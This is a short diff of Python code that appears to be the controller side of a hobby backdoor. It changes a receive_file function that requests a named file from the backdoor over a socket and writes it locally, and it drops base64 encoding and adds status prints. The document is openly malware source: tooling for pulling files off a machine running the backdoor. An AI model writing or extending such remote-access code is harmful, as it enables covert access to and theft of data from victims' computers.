@@ -1,7 +1,7 @@
 import socket
-#from test_backdoor import handle_commands
-import base64
-from fileinput import filename
+
+
+
 
 
 #Test Push
@@ -29,10 +29,11 @@ def handle_command(client_socket):
 # Function to receive file from the backdoor
 def receive_file(client_socket):
     filename = input("Input the Filename: ")
-    client_socket.send(base64.b64encode(filename.encode('utf-8')))
+    client_socket.send(filename.encode('utf-8'))
 
     msg = client_socket.recv(1024)
-    if base64.b64decode(msg.decode('utf-8')) == "File not found":
+    if msg.decode('utf-8') == "File not found":
+        print(msg)
         handle_command(client_socket)
     else:
         with open(filename, 'wb') as file:  # Open the file to save it locally
@@ -43,6 +44,7 @@ def receive_file(client_socket):
                    break
 
                file.write(chunk)
+        print("File Downloaded!")
 
 
 
